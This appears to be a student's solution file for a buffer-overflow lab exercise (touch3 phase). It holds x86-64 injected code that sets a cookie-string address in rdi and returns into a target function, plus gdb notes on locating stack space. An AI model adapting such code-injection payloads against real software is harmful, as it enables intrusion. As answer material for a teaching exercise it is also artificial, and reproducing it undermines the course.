movq $0x55614158, %rdi		/* move the cookie string address to rdi */
pushq $0x00401a9c		/* push touch3 address */
retq

/* We set break point at getbuf function, and run it, and ni and ni until Gets funciton */
/* and do x /20x $rsp to examine the rsp on stack */
/* There are some spaces to put data, but I decide to put in address 55614158 */